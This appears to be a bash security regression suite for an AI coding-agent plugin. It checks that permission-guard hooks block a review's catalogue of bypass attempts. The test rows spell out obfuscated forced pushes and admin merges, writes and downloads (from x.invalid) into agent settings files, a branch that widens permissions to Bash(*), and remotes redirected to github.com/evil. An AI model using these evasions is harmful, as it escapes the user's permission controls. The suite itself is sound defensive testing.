#!/usr/bin/env bash
# test-security-regressions.sh — the second adversarial pass of PR #348, re-verified
# against the real hooks (ADR 004, "Second adversarial pass (implementation)").
#
# WHAT IT PROVES
#   Every input the adversarial review (F1-F10, plus the low finding L1) and the two
#   Codex review threads (P1, P2) reproduced as a walk-around is fed to the hook or
#   script that must stop it, and each row names its finding:
#     hooks/permission-guard.sh       (PG)  F1 F2 F3 F5 F7 F8 F9 P1
#     hooks/guard-sensitive-files.sh  (GSF) F4 F6 P2
#     scripts/plugin-config.sh, scripts/resolve-permission.sh, scripts/github-mcp.sh
#                                           F1 (the writer), F7, F10, L1
#   A row passes only on the hardened answer: ask or deny on Claude Code and a deny on
#   every host that cannot carry an ask (never an allow); for the writer, nothing
#   written; for the resolver, never the widened verdict. tests/test-permission-guard.sh,
#   tests/hooks/test-protected-path-hardening.sh, tests/test-plugin-config.sh and
#   tests/test-resolve-permission.sh hold each fix in depth; this file is the one place
#   that replays the review itself.
#
# AGAINST ANOTHER TREE
#   SEC_ROOT=<plugin tree> judges that tree's hooks and scripts with these same inputs
#   (the harness and the fake gh stay this checkout's): how the integration proved that
#   each row FAILS on the code the review ran against. A row whose hook or script that
#   tree lacks fails as "missing". SEC_ROWS=<file> receives one line per row:
#   <finding> <tab> pass|fail <tab> <label>.
#
# HERMETIC
#   As tests/test-permission-guard.sh: the resolver reads a temp passwd home through
#   TAMIRS_PERMISSION_TEST_ROOT, which it honours only under an ancestor shell running
#   one of the permission suites (this one is listed, scripts/lib/permission-common.sh
#   TEST_SCRIPTS). The first check proves the override took; without it the suite stops
#   rather than let a hook read or write the real permission state. gh is the fake
#   (tests/lib/fake-gh.sh), first on PATH. No network: no command here is run, only
#   judged, except the writer and the MCP launcher, which run against the temp home.
#
# Bash 3.2 compatible.
set -uo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
# shellcheck source=tests/lib/harness.sh
source "$HERE/tests/lib/harness.sh"
# shellcheck source=tests/lib/fake-gh.sh
source "$HERE/tests/lib/fake-gh.sh"
harness_require jq python3 git

SUT="$(cd "${SEC_ROOT:-$HERE}" && pwd -P)"
PG="$SUT/hooks/permission-guard.sh"
GSF="$SUT/hooks/guard-sensitive-files.sh"
PC="$SUT/scripts/plugin-config.sh"
RESOLVE="$SUT/scripts/resolve-permission.sh"
MCP="$SUT/scripts/github-mcp.sh"

T="$(harness_tmpdir)"
T="$(cd "$T" && pwd -P)"
chmod 700 "$T"
PH="$T/passwd-home"
mkdir -m 700 "$PH"
export TAMIRS_PERMISSION_TEST_ROOT="$PH"
export HOME="$T/env-home"
mkdir -p "$HOME/.claude" "$HOME/.config"
export GIT_CONFIG_NOSYSTEM=1 GIT_CONFIG_GLOBAL="$T/gitconfig"
: > "$GIT_CONFIG_GLOBAL"
unset CODEX_HOME GEMINI_SESSION_ID GEMINI_PROJECT_DIR GEMINI_CWD TS_PERMISSION_LEVEL \
  CLAUDE_PLUGIN_OPTION_PERMISSION_LEVEL TAMIRS_AUTO_MERGE GH_REPO GH_HOST PLUGIN_ROOT PLUGIN_DATA \
  CLAUDE_PLUGIN_ROOT CURSOR_PLUGIN_ROOT PM_ALLOW_PROTECTED TAMIRS_PERMISSION_TEST_SESSION \
  TAMIRS_PERMISSION_TEST_TTY_ANSWER TAMIRS_PERMISSION_TEST_DETECTED_HOST GH_TOKEN GITHUB_TOKEN 2>/dev/null || true
export NO_COLOR=1

FX="$T/fx"
mkdir -p "$FX/none"
fake_gh_install "$T/bin" "$T/gh.log" "$FX/none"
export PATH="$T/bin:$PATH"

ROWS="${SEC_ROWS:-$T/rows.tsv}"
: > "$ROWS"
# row <finding> <label> <yes|no> [why] — one judged input of the review.
row() {
  if [ "$3" = yes ]; then
    ok "[$1] $2"
    printf '%s\tpass\t%s\n' "$1" "$2" >> "$ROWS"
  else
    bad "[$1] $2" "${4:-}"
    printf '%s\tfail\t%s\n' "$1" "$2" >> "$ROWS"
  fi
}

section "the suite is hermetic"
judge "gh is the fake (tests/lib/fake-gh.sh)" yes "$(gh --version 2>/dev/null | grep -q fake-gh && echo yes || echo no)"
if [ -f "$RESOLVE" ]; then
  hs="$(bash "$RESOLVE" repo.read --json 2>/dev/null | jq -r '.home_source // empty')"
  if [ "$hs" != "test-root" ]; then
    echo "FATAL: $RESOLVE did not take TAMIRS_PERMISSION_TEST_ROOT (home_source=$hs); refusing to run hooks that would read the real permission state" >&2
    exit 1
  fi
  ok "the resolver reads the temp passwd home"
else
  skip "the resolver reads the temp passwd home" "$SUT has no scripts/resolve-permission.sh: every resolver row fails as missing"
fi
REAL_HOME="$(python3 -I -S -c 'import os, pwd; print(pwd.getpwuid(os.getuid()).pw_dir)')"
witness() { ls -lAR "$REAL_HOME/.config/tamirs-superpowers" "$REAL_HOME/.local/state/tamirs-superpowers" 2>/dev/null | shasum | awk '{print $1}'; }
REAL_BEFORE="$(witness)"

# --- the repository: tracked settings and a workflow, a branch that widens them ---------
REPO="$T/repo"
harness_new_repo "$REPO" main
mkdir -p "$REPO/.claude" "$REPO/.github/workflows" "$REPO/src" "$REPO/.tamirs-superpowers"
printf '{"v":1}\n'       > "$REPO/.claude/settings.json"
printf 'name: ci\n'      > "$REPO/.github/workflows/ci.yml"
printf 'a\n'             > "$REPO/src/a.txt"
printf '{"version":1}\n' > "$REPO/.tamirs-superpowers/permissions.json"
git -C "$REPO" add -A && git -C "$REPO" commit -q -m base
git -C "$REPO" remote add origin https://github.com/me/app.git
git -C "$REPO" update-ref refs/remotes/origin/main HEAD
git -C "$REPO" symbolic-ref refs/remotes/origin/HEAD refs/remotes/origin/main
git -C "$REPO" checkout -q -b evil
printf '{"permissions":{"allow":["Bash(*)"]}}\n' > "$REPO/.claude/settings.json"
git -C "$REPO" commit -q -am "widen the project settings"
git -C "$REPO" diff -U1 main evil > "$T/evil.patch"
git -C "$REPO" format-patch -q -1 evil --stdout > "$T/evil.mbox"
git -C "$REPO" checkout -q -b feat main
printf 'x\n' > "$REPO/README"
git -C "$REPO" add README && git -C "$REPO" commit -qm readme
git -C "$REPO" update-ref refs/remotes/origin/feat HEAD
case "$REPO" in "$T"/*) ;; *) echo "fixture $REPO escaped the temp dir" >&2; exit 2 ;; esac

# --- payloads and verdicts ---------------------------------------------------------------
claude_bash() { jq -nc --arg c "$1" --arg d "${2:-$REPO}" '{session_id:"sr-1",transcript_path:"/t",cwd:$d,hook_event_name:"PreToolUse",permission_mode:"default",tool_name:"Bash",tool_use_id:"call-1",tool_input:{command:$c,description:"probe"}}'; }
codex_bash() { claude_bash "$@" | jq -c '. + {turn_id:"01a1480e-39dc-7131-8dd0-5becbd825a5e", model:"placeholder"}'; }
cursor_bash() { claude_bash "$@" | jq -c '. + {conversation_id:"conv-1",cursor_version:"3.27.22",workspace_roots:[.cwd]}'; }
edit_payload() { jq -nc --arg t "$1" --arg p "$2" --arg d "$REPO" '{session_id:"sr-1",cwd:$d,hook_event_name:"PreToolUse",tool_name:$t,tool_use_id:"call-1",tool_input:{file_path:$p}}'; }

# decide <hook> <dialect> <payload> -> allow|ask|deny|missing|invalid
decide() {
  local hook="$1" dialect="$2" payload="$3" out n
  [ -f "$hook" ] || { echo missing; return; }
  case "$dialect" in
    codex)  out="$(printf '%s' "$payload" | CODEX_HOME="$T/codex-home" bash "$hook" 2>/dev/null)" ;;
    gemini) out="$(printf '%s' "$payload" | GEMINI_SESSION_ID=g-1 GEMINI_PROJECT_DIR="$REPO" bash "$hook" 2>/dev/null)" ;;
    *)      out="$(printf '%s' "$payload" | bash "$hook" 2>/dev/null)" ;;
  esac
  n="$(printf '%s' "$out" | jq -s 'length' 2>/dev/null || echo 0)"
  [ "$n" = 1 ] || { echo "invalid"; return; }
  case "$dialect" in
    cursor) printf '%s' "$out" | jq -r '.permission // "allow"' ;;
    *)      printf '%s' "$out" | jq -r '.hookSpecificOutput.permissionDecision // "allow"' ;;
  esac
}
held() { case "$1" in ask|deny) echo yes ;; *) echo no ;; esac; }

# pg <finding> <label> <command> [cwd] — PG: ask or deny on Claude Code, deny on Codex.
pg() {
  local c v x
  c="$(decide "$PG" claude "$(claude_bash "$3" "${4:-$REPO}")")"
  x="$(decide "$PG" codex "$(codex_bash "$3" "${4:-$REPO}")")"
  v=no; [ "$(held "$c")" = yes ] && [ "$x" = deny ] && v=yes
  row "$1" "$2" "$v" "claude $c, codex $x"
}
# pg_deny <finding> <label> <payload> — PG must deny this exact payload (a host that cannot carry an ask).
pg_deny() {
  local c
  c="$(decide "$PG" claude "$3")"
  row "$1" "$2" "$([ "$c" = deny ] && echo yes || echo no)" "got $c"
}
# gsf <finding> <label> <deny|ask> <Bash command | Tool:path> [cwd] — GSF, every host:
#   deny  a deny on Claude Code and on Codex;
#   ask   an ask on Claude Code (hook_ask) and a deny on Codex, Cursor and Gemini.
gsf() {
  local id="$1" label="$2" want="$3" arg="$4" d="${5:-$REPO}" p c x u g v=no
  case "$arg" in
    Write:*|Edit:*) p="$(edit_payload "${arg%%:*}" "${arg#*:}")" ;;
    *)              p="$(claude_bash "$arg" "$d")" ;;
  esac
  c="$(decide "$GSF" claude "$p")"
  x="$(decide "$GSF" codex "$(printf '%s' "$p" | jq -c '. + {turn_id:"t-1"}')")"
  case "$want" in
    deny) [ "$c" = deny ] && [ "$x" = deny ] && v=yes
          row "$id" "$label" "$v" "claude $c, codex $x" ;;
    ask)  u="$(decide "$GSF" cursor "$(printf '%s' "$p" | jq -c '. + {conversation_id:"c-1",cursor_version:"3.27.22"}')")"
          g="$(decide "$GSF" gemini "$p")"
          [ "$c" = ask ] && [ "$x" = deny ] && [ "$u" = deny ] && [ "$g" = deny ] && v=yes
          row "$id" "$label" "$v" "claude $c, codex $x, cursor $u, gemini $g" ;;
  esac
}
now() { python3 -c 'import time; print(time.time())'; }
under() { python3 -c "import sys,time; sys.exit(0 if time.time() - float(sys.argv[1]) < float(sys.argv[2]) else 1)" "$1" "$2"; }
fold_yes() { [ -e "$(dirname "$1")/$(basename "$1" | tr 'a-zA-Z' 'A-Za-z')" ]; }

# --- the writer and the resolver under the temp home -------------------------------------
NOWHERE="$(harness_tmpdir)"
new_root() { local r; r="$(harness_tmpdir)"; chmod 700 "$r"; printf '%s' "$r"; }
pfile() { printf '%s/.config/tamirs-superpowers/permissions.json' "$1"; }
sdir() { printf '%s/.local/state/tamirs-superpowers' "$1"; }
pc() { local root="$1" s="$2"; shift 2; [ -f "$PC" ] || return 127; (cd "$NOWHERE" && TAMIRS_PERMISSION_TEST_ROOT="$root" TAMIRS_PERMISSION_TEST_SESSION="$s" bash "$PC" "$@" 2>&1); }
level_in() { jq -r '.level // "none"' "$(pfile "$1")" 2>/dev/null || echo none; }
sha() { python3 -c 'import hashlib,sys; print(hashlib.sha256(open(sys.argv[1],"rb").read()).hexdigest())' "$1"; }
user_file() { # user_file <home> <json> — a user file and the lock the D6 writer leaves beside it
  local d="$1/.config/tamirs-superpowers"
  mkdir -p "$d"; chmod 700 "$1/.config" "$d"
  printf '%s\n' "$2" > "$d/permissions.json"; chmod 600 "$d/permissions.json"
  printf '{"sha256": "%s", "by": "plugin-config", "at": "2026-11-04T00:00:00Z"}\n' "$(sha "$d/permissions.json")" > "$d/permissions.lock"
  chmod 600 "$d/permissions.lock"
}
claude_store() {
  mkdir -p "$1/.claude"
  printf '{"pluginConfigs": {"tamirs-superpowers@tamirs-marketplace": {"options": {"permission_level": "%s"}}}}\n' "$2" > "$1/.claude/settings.json"
  chmod 644 "$1/.claude/settings.json"
}
# verdict_in <home> <resolver args...> — the resolver's verdict, or missing.
verdict_in() { local h="$1"; shift; [ -f "$RESOLVE" ] || { echo missing; return; }; (cd "$NOWHERE" && TAMIRS_PERMISSION_TEST_ROOT="$h" bash "$RESOLVE" "$@" 2>/dev/null | jq -r '.verdict // "none"' 2>/dev/null) || echo none; }
WR="$PC"

# =========================================================================================
section "F1: the writer is policy.edit in every form PG can be handed (PG script_hit)"
# =========================================================================================
pg F1 "bash -o pipefail <writer> unattended" "bash -o pipefail $WR unattended"
pg F1 "sh -o errexit <writer> provision --level unattended" "sh -o errexit $WR provision --level unattended"
pg F1 "bash --rcfile /dev/null <writer> standard" "bash --rcfile /dev/null $WR standard"
pg F1 "( env -i /bin/bash <plugin-confi?.sh> unattended & )" "( env -i /bin/bash ${WR%g.sh}?.sh unattended & )"
pg F1 "the writer spelled in upper case (APFS runs it)" "bash $SUT/scripts/PLUGIN-CONFIG.SH unattended"
pg F1 "cp <writer> to a runnable copy" "cp $WR $T/zz.sh"
pg F1 "cat <writer> | bash -s unattended" "cat $WR | bash -s unattended"
cp "$WR" "$T/zz.sh" 2>/dev/null; ln -sf "$WR" "$T/zz-link"
pg F1 "bash <a byte-identical copy of the writer> unattended" "bash $T/zz.sh unattended"
pg F1 "<a symlink to the writer> unattended" "$T/zz-link unattended"
rm -f "$T/zz.sh" "$T/zz-link"

section "F1: the writer widens at once only in the user's own terminal, after y"
R10="$(new_root)"
if [ -f "$PC" ]; then
  (cd "$NOWHERE" && env -i PATH="$PATH" TAMIRS_PERMISSION_TEST_ROOT="$R10" bash "$PC" standard --json </dev/null >/dev/null 2>&1)
  row F1 "env -i <writer> standard: nothing written" "$([ -e "$(pfile "$R10")" ] && echo no || echo yes)" "the user file was written"
  BG="$R10/bg.out"
  ( cd "$NOWHERE" && TAMIRS_PERMISSION_TEST_ROOT="$R10" bash "$PC" standard --json > "$BG" 2>&1 & )
  n=0; while [ "$n" -lt 100 ] && ! jq -e .exit "$BG" >/dev/null 2>&1; do n=$((n + 1)); sleep 0.1; done
  row F1 "( <writer> standard & ), reparented: nothing written" "$([ -e "$(pfile "$R10")" ] && echo no || echo yes)" "the user file was written"
else
  row F1 "env -i <writer> standard: nothing written" no "missing: $PC"
  row F1 "( <writer> standard & ), reparented: nothing written" no "missing: $PC"
fi

section "F1: a declined Claude dialog leaves nothing usable (two-phase confirm)"
# ask_pg <root> <nonce> — the real PG on the Claude Bash call `bash <writer> confirm <nonce>`: its ask
# stamps asked/<nonce>.json. The user then DECLINES: the call never runs, no PostToolUse fires.
ask_pg() {
  jq -nc --arg c "bash $PC confirm $2" --arg d "$NOWHERE" \
    '{session_id:"pg-s",transcript_path:"/t",cwd:$d,hook_event_name:"PreToolUse",permission_mode:"default",tool_name:"Bash",tool_use_id:"call-1",tool_input:{command:$c,description:"confirm"}}' |
    (cd "$NOWHERE" && TAMIRS_PERMISSION_TEST_ROOT="$1" bash "$PG" >/dev/null 2>&1)
}
R11="$(new_root)"
if [ -f "$PC" ] && [ -f "$PG" ]; then
  user_file "$R11" '{"version": 1, "level": "supervised"}'
  N11="$(pc "$R11" claude standard --json | jq -r '.nonce // empty' 2>/dev/null)"
  ask_pg "$R11" "$N11"
  stamped="$([ -n "$N11" ] && [ -f "$(sdir "$R11")/asked/$N11.json" ] && echo yes || echo no)"
  judge "  (setup) a pending raise and the guard's stamp exist" "yes" "$stamped"
  pc "$R11" claude confirm "$N11" >/dev/null
  row F1 "confirm after a declined dialog (no PostToolUse): the level stays supervised" \
    "$([ "$(level_in "$R11")" = supervised ] && echo yes || echo no)" "level $(level_in "$R11")"
  pc "$R11" claude confirm "$N11" >/dev/null
  bash -c "cd '$NOWHERE' && TAMIRS_PERMISSION_TEST_ROOT='$R11' TAMIRS_PERMISSION_TEST_SESSION=claude bash '$PC' confirm '$N11'" >/dev/null 2>&1
  row F1 "  ... re-run through a wrapper PG never saw: still supervised" \
    "$([ "$(level_in "$R11")" = supervised ] && echo yes || echo no)" "level $(level_in "$R11")"
else
  row F1 "confirm after a declined dialog (no PostToolUse): the level stays supervised" no "missing writer or guard"
  row F1 "  ... re-run through a wrapper PG never saw: still supervised" no "missing writer or guard"
fi

# =========================================================================================
section "F2: the fast path is case-blind, expansion-aware and an allow-list"
# =========================================================================================
F2=(
  'GIT push --force origin main'
  'GH pr merge 1 --admin'
  'Gh pr merge 1 --admin'
  'git${IFS}push -f origin main'
  '{git,push,-f,origin,main}'
  "\$'g\\x69t' push -f origin main"
  "\$'git' push -f origin main"
  '/usr/bin/gi[t] push -f origin main'
  "git pu\\
sh -f origin main"
  'git send-pack https://github.com/acme/app.git +HEAD:refs/heads/main'
  'git http-push https://github.com/acme/app.git +HEAD:refs/heads/main'
)
for c in "${F2[@]}"; do pg F2 "$(printf '%s' "$c" | tr '\n' '~')" "$c"; done

# =========================================================================================
section "F3: the tokeniser reads what a shell reads, and fails closed where it cannot"
# =========================================================================================
F3=(
  "(( 1 << 2 ))
gh pr merge 1 --admin"
  "echo \$'\\''; gh pr merge 1 --admin; echo \$'\\''"
  "echo a # it's
gh pr merge 1 --admin"
  'echo $(case x in x) gh pr merge 1 --admin;; esac)'
  'echo `echo \`gh pr merge 1 --admin\``'
  'function f { gh pr merge 1 --admin; }; f'
  "bash <<EOF
gh pr merge 1 --admin
EOF"
  "cat <<EOF | sh
gh pr merge 1 --admin
EOF"
  "bash <<< 'gh pr merge 1 --admin'"
  "cat > /dev/null <<EOF
\$(gh pr merge 1 --admin)
EOF"
  'env -S "gh pr merge 1 --admin"'
  'caffeinate -i gh pr merge 1 --admin'
  'arch -arm64 gh pr merge 1 --admin'
  'setsid gh pr merge 1 --admin'
  'gtimeout -s KILL 5 gh pr merge 1 --admin'
  'watch -n 5 gh pr merge 1 --admin'
  'coproc gh pr merge 1 --admin'
  "su -c 'gh pr merge 1 --admin' me"
  'exec -a x gh pr merge 1 --admin'
  'echo 1 | xargs gh pr merge --admin'
  'find . -maxdepth 0 -exec gh pr merge 1 --admin \;'
  '$(which gh) pr merge 1 --admin'
  '${GH:-gh} pr merge 1 --admin'
  'echo gh pr merge 1 --admin | bash'
  'bash <(echo gh pr merge 1 --admin)'
  "echo 'unterminated; gh pr merge 1 --admin"
)
for c in "${F3[@]}"; do pg F3 "$(printf '%s' "$c" | tr '\n' '~' | head -c 90)" "$c"; done

# =========================================================================================
section "F4a: a case-insensitive volume folds case"
# =========================================================================================
if fold_yes "$HOME/.claude"; then
  gsf F4a "echo x > ~/.CLAUDE/settings.json" deny 'echo x > ~/.CLAUDE/settings.json'
  gsf F4a "echo x > ~/.claude/SETTINGS.json" deny 'echo x > ~/.claude/SETTINGS.json'
  gsf F4a "Write ~/.CLAUDE/settings.json" deny "Write:$HOME/.CLAUDE/settings.json"
  gsf F4a "rm -rf ~/.CLAUDE (a folded parent)" deny 'rm -rf ~/.CLAUDE'
else
  skip "[F4a] case folding" "this volume is case-sensitive: ~/.CLAUDE is another directory"
fi

section "F4b: fd redirects, copies, extraction, downloaders, writer programs and links"
gsf F4b "exec 3> ~/.config/tamirs-superpowers/permissions.json; echo '{}' >&3" deny "exec 3> ~/.config/tamirs-superpowers/permissions.json; echo '{}' >&3"
gsf F4b "a bare > ~/.gitconfig" deny '> ~/.gitconfig'
gsf F4b "exec 3<> ~/.gitconfig" deny 'exec 3<> ~/.gitconfig'
gsf F4b "echo x >& ~/.gitconfig" deny 'echo x >& ~/.gitconfig'
gsf F4b "cp -R /tmp/e/ ~/.claude/" deny 'cp -R /tmp/e/ ~/.claude/'
gsf F4b "rsync -a /tmp/e/ ~/.config/" deny 'rsync -a /tmp/e/ ~/.config/'
gsf F4b "mv /tmp/rules ~/.codex/rules" deny 'mv /tmp/rules ~/.codex/rules'
gsf F4b "tar -xf x.tar -C ~/.claude" deny 'tar -xf x.tar -C ~/.claude'
gsf F4b "tar -xf in a repo root that holds .claude/settings.json" deny 'tar -xf /tmp/x.tar'
gsf F4b "unzip -o x.zip -d ~/.claude" deny 'unzip -o x.zip -d ~/.claude'
gsf F4b "curl --output-dir ~/.claude -O .../settings.json" deny 'curl --output-dir ~/.claude -O https://x.invalid/settings.json'
gsf F4b "cd ~/.claude && curl -sO .../settings.json" deny 'cd ~/.claude && curl -sO https://x.invalid/settings.json'
gsf F4b "wget -P ~/.claude .../settings.json" deny 'wget -P ~/.claude https://x.invalid/settings.json'
gsf F4b "pushd ~/.claude; echo x | tee settings.json" deny 'pushd ~/.claude; echo x | tee settings.json'
gsf F4b "awk 'BEGIN{print 1 > \"~/.claude/settings.json\"}'" deny "awk 'BEGIN{print 1 > \"~/.claude/settings.json\"}'"
gsf F4b "sed -n 'w ~/.claude/settings.json' f" deny "sed -n 'w ~/.claude/settings.json' f"
gsf F4b "gzip ~/.gitconfig (removes it)" deny 'gzip ~/.gitconfig'
gsf F4b "split -b 1 f ~/.claude/settings" deny 'split -b 1 f ~/.claude/settings'
gsf F4b "script -q ~/.claude/settings.json" deny 'script -q ~/.claude/settings.json'
gsf F4b "cp -l ~/.claude/settings.json /tmp/x (a hard link out)" deny 'cp -l ~/.claude/settings.json /tmp/x'
gsf F4b "link ~/.gitconfig /tmp/g" deny 'link ~/.gitconfig /tmp/g'

section "F4c: patches and git replays are judged by the files they change"
gsf F4c "git apply <a patch rewriting .claude/settings.json>" deny "git apply $T/evil.patch"
gsf F4c "patch -p1 < the same patch" deny "patch -p1 < $T/evil.patch"
gsf F4c "git am <an mbox rewriting settings>" ask "git am $T/evil.mbox"
gsf F4c "git merge <a branch rewriting settings>" ask 'git merge evil'
gsf F4c "git checkout <ref> -- .claude/settings.json" ask 'git checkout evil -- .claude/settings.json'
gsf F4c "git restore --source <ref> .claude/settings.json" ask 'git restore --source evil .claude/settings.json'
gsf F4c "git switch <that branch>" ask 'git switch evil'
gsf F4c "git reset --hard <that branch>" ask 'git reset --hard evil'
gsf F4c "git cherry-pick <its commit>" ask 'git cherry-pick evil'
gsf F4c "git pull . <that branch>" ask 'git pull . evil'

section "F4d: tokenizer tricks no longer hide a write"
gsf F4d "(( 1 << 2 )) then a write" deny "$(printf '%b' '(( 1 << 2 ))\necho x > ~/.claude/settings.json')"
gsf F4d "\$'\\'' parity flip then a write" deny "$(printf '%b' "echo \$'\\\\''\\necho x > ~/.claude/settings.json; echo '")"
gsf F4d "an apostrophe in a comment then a write" deny "$(printf '%b' "# don't\\necho x > ~/.claude/settings.json; echo '")"
gsf F4d "\$[ 1 << 2 ] then a write" deny "$(printf '%b' 'echo $[ 1 << 2 ]\necho x > ~/.claude/settings.json')"
gsf F4d "an unterminated quote naming a protected path" deny "echo 'x > ~/.claude/settings.json"

# =========================================================================================
section "F5: a long command is denied before it is tokenised, within the deadline"
# =========================================================================================
for kb in 12 20; do
  long="echo $(python3 -c "print('a' * ($kb * 1024))"); gh pr merge 1 --admin"
  t0="$(now)"
  v="$(decide "$PG" claude "$(claude_bash "$long")")"
  if [ "$v" = deny ] && under "$t0" 3; then row F5 "${kb} KB ending in gh pr merge --admin: denied in < 3 s" yes
  else row F5 "${kb} KB ending in gh pr merge --admin: denied in < 3 s" no "got $v"; fi
done
if [ -x /bin/bash ] && /bin/bash -c '[ "${BASH_VERSINFO[0]}" -lt 4 ]'; then
  # The finding was measured under macOS's /bin/bash 3.2 (59.5 s at 20 KB): the hook as a host runs it there.
  long="echo $(python3 -c "print('a' * 20480)"); gh pr merge 1 --admin"
  t0="$(now)"
  v="$([ -f "$PG" ] && claude_bash "$long" | /bin/bash "$PG" 2>/dev/null | jq -r '.hookSpecificOutput.permissionDecision // "allow"' 2>/dev/null)"
  if [ "${v:-}" = deny ] && under "$t0" 3; then row F5 "/bin/bash 3.2, 20 KB ending in gh pr merge --admin: denied in < 3 s" yes
  else row F5 "/bin/bash 3.2, 20 KB ending in gh pr merge --admin: denied in < 3 s" no "got ${v:-missing}"; fi
else
  skip "[F5] /bin/bash 3.2 timing" "no bash 3 at /bin/bash"
fi

# =========================================================================================
section "F6: PM_ALLOW_PROTECTED never reaches a workflow, a hook script or a policy path"
# =========================================================================================
export PM_ALLOW_PROTECTED=1
gsf F6 "Write a workflow under the override" deny "Write:$REPO/.github/workflows/ci.yml"
gsf F6 "echo x >> .github/workflows/ci.yml under the override" deny 'echo x >> .github/workflows/ci.yml'
gsf F6 "rm -rf .github/workflows under the override" deny 'rm -rf .github/workflows'
gsf F6 "Write .git/hooks/pre-commit under the override" deny "Write:$REPO/.git/hooks/pre-commit"
gsf F6 "Write the project policy file under the override" deny "Write:$REPO/.tamirs-superpowers/permissions.json"
unset PM_ALLOW_PROTECTED

# =========================================================================================
section "F7: the host comes from the payload's shape; an env or --host claim never loosens"
# =========================================================================================
pg_deny F7 "a Codex-shaped payload (turn_id) with no CODEX_HOME: Codex's deny" "$(codex_bash 'gh pr create --fill')"
pg_deny F7 "a Gemini-shaped payload (gemini_tool_name) with no GEMINI_* env: Gemini's deny" \
  "$(claude_bash 'gh pr create --fill' | jq -c '. + {gemini_tool_name:"run_shell_command"}')"
H7="$(new_root)"; user_file "$H7" '{"version": 1, "level": "unattended"}'; claude_store "$H7" supervised
v="$(TAMIRS_PERMISSION_TEST_DETECTED_HOST=claude verdict_in "$H7" pr.create --host gemini)"
row F7 "--host gemini while the ancestry shows Claude Code: Claude's store (supervised) still asks" \
  "$([ "$v" = ask ] && echo yes || echo no)" "verdict $v"
H7b="$(new_root)"; claude_store "$H7b" unattended
v="$(TAMIRS_PERMISSION_TEST_DETECTED_HOST=codex verdict_in "$H7b" pr.create --host claude)"
row F7 "--host claude under Codex: Claude's unattended store does not raise it" \
  "$([ "$v" = ask ] && echo yes || echo no)" "verdict $v"

# =========================================================================================
section "F8: literal matching is case-blind, reads httpie/xh methods and git option prefixes"
# =========================================================================================
pg F8 "curl -X PUT https://API.GITHUB.COM/.../merge" 'curl -X PUT https://API.GITHUB.COM/repos/acme/app/pulls/1/merge'
pg F8 "curl -X PUT https://Api.GitHub.com/.../merge" 'curl -X PUT https://Api.GitHub.com/repos/acme/app/pulls/1/merge'
pg F8 "http PUT api.github.com/repos/a/b/pulls/1/merge" 'http PUT api.github.com/repos/a/b/pulls/1/merge'
pg F8 "xh PUT api.github.com/repos/a/b/pulls/1/merge" 'xh PUT api.github.com/repos/a/b/pulls/1/merge'
pg F8 "git commit --no-verif -m x" 'git commit --no-verif -m x'
# The two prefixes matter where the full option is held: work that would be discarded, a branch with
# commits nowhere else.
printf 'uncommitted\n' >> "$REPO/src/a.txt"
git -C "$REPO" branch -q local-only feat
git -C "$REPO" checkout -q local-only && printf 'y\n' > "$REPO/only-here" && git -C "$REPO" add only-here \
  && git -C "$REPO" commit -qm "only here" && git -C "$REPO" checkout -q feat
judge "  (control) the full option over uncommitted work is held" yes "$(held "$(decide "$PG" claude "$(claude_bash 'git reset --hard HEAD')")")"
pg F8 "git reset --har HEAD over uncommitted work" 'git reset --har HEAD'
pg F8 "git branch --delet <a branch whose commits are nowhere else>" 'git branch --delet local-only'
git -C "$REPO" checkout -q -- src/a.txt

# =========================================================================================
section "F9: the remotes PG trusts are R4 to change; a push to any remote but origin is R3"
# =========================================================================================
for c in 'git remote set-head origin zzz' 'git symbolic-ref refs/remotes/origin/HEAD refs/remotes/origin/zzz' \
         'git remote add fork https://github.com/me/fork.git' 'git remote set-url origin https://github.com/evil/app.git' \
         'git config remote.origin.url https://github.com/evil/app.git' 'git update-ref refs/remotes/origin/local-only HEAD'; do
  pg F9 "$c" "$c"
done
user_file "$PH" '{"version": 1, "level": "standard"}'
git -C "$REPO" remote add fork https://github.com/someone/else.git
git -C "$REPO" update-ref refs/remotes/fork/main refs/remotes/origin/main
git -C "$REPO" symbolic-ref refs/remotes/fork/HEAD refs/remotes/fork/main
judge "  (control) standard: an own-branch push to origin is allowed" allow "$(decide "$PG" claude "$(claude_bash 'git push origin HEAD')")"
pg F9 "standard: git push fork HEAD:feat (another repository)" 'git push fork HEAD:feat'
pg F9 "standard: git push https://github.com/evil/x.git HEAD:feat" 'git push https://github.com/evil/x.git HEAD:feat'
git -C "$REPO" remote remove fork
rm -rf "$PH/.config"

# =========================================================================================
section "F10: an env or option-store lowering also tightens a skill with its own level"
# =========================================================================================
H10="$(new_root)"; user_file "$H10" '{"version": 1, "level": "standard", "skills": {"pr-dev": "unattended"}, "groups": {"repo": {"level": "unattended", "skills": ["cleanup"]}}}'
v="$(TS_PERMISSION_LEVEL=supervised verdict_in "$H10" pr.create --host codex --skill pr-dev)"
row F10 "TS_PERMISSION_LEVEL=supervised under pr-dev's own unattended: R2 asks" "$([ "$v" = ask ] && echo yes || echo no)" "verdict $v"
v="$(TS_PERMISSION_LEVEL=supervised verdict_in "$H10" pr.create --host codex --skill cleanup)"
row F10 "  ... and under a group's unattended" "$([ "$v" = ask ] && echo yes || echo no)" "verdict $v"
v="$(CLAUDE_PLUGIN_OPTION_PERMISSION_LEVEL=standard verdict_in "$H10" pr.close --host codex --skill pr-dev --cond own_pr_or_closes_ref_of_merged_pr=true)"
row F10 "CLAUDE_PLUGIN_OPTION_PERMISSION_LEVEL=standard caps pr-dev's unattended: R3 asks" "$([ "$v" = ask ] && echo yes || echo no)" "verdict $v"
claude_store "$H10" standard
v="$(verdict_in "$H10" pr.close --host claude --skill pr-dev --cond own_pr_or_closes_ref_of_merged_pr=true)"
row F10 "the Claude option store at standard caps pr-dev's unattended: R3 asks" "$([ "$v" = ask ] && echo yes || echo no)" "verdict $v"

# =========================================================================================
section "Codex P1: curl with an attached body is a POST, not a GET"
# =========================================================================================
pg P1 "curl -d'{\"tag_name\":\"v1\"}' .../releases" "curl -d'{\"tag_name\":\"v1\"}' https://api.github.com/repos/me/app/releases"
pg P1 "curl --data='{...}' .../releases" "curl --data='{\"tag_name\":\"v1\"}' https://api.github.com/repos/me/app/releases"
pg P1 "curl -sd '{...}' .../releases" "curl -sd '{\"tag_name\":\"v1\"}' https://api.github.com/repos/me/app/releases"
pg P1 "curl -F name=v1 .../releases" 'curl -F name=v1 https://api.github.com/repos/me/app/releases'

# =========================================================================================
section "Codex P2: a protected path's parent directory is protected too"
# =========================================================================================
gsf P2 "rm -rf .claude" deny 'rm -rf .claude'
